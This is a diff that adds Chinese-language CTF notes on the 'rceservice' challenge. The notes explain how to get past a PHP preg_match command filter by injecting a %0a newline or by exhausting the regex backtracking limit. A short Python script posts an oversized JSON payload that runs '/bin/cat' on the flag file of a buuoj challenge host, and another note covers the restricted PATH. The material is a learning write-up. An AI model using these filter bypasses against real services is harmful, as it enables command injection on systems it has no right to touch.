@@ -27,6 +27,38 @@
 
 这段代码检查变量`$ip`是否包含由任意字符分割的字母序列'f','l','a','g'.
 
+
+
+**绕过方法**:
+
+1.`preg_match`只能匹配第一行，所以这里可以采用多行绕过。
+
+使用get方式提交类似payload:
+
+`{%0a"cmd":"ls /"%0a}`即可绕过对`/`的匹配
+
+2.回溯
+
+具体脚本:
+
+```
+import requests
+
+payload = '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a" * (1000000) + '"}'
+
+res = requests.post("http://5881937a-a9b5-4d44-84f2-844ed296aecd.node5.buuoj.cn:81/", data={"cmd": payload})
+print(res.text)
+
+```
+
+原理:
+
+利用post提交超长payload绕过匹配
+
+
+
+
+
 ### isset($_GET['key'])
 
 `isset($_GET['key'])` 是用于检查 `$_GET` 超全局数组中是否存在名为 'key' 的键的函数。
@@ -1356,3 +1388,9 @@ get_machine_id()：  系统id  /etc/machine-id    或者docker环境id /proc/sel
 
 
 ![image-20240425233157687](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425233157687.png)
+
+
+
+## putenv('PATH=/home/rceservice/jail');
+
+因为`putenv('PATH=/home/rceservice/jail');`修改了环境变量，所以只能使用绝对路径使用cat命令，`cat`命令在`/bin`文件夹下
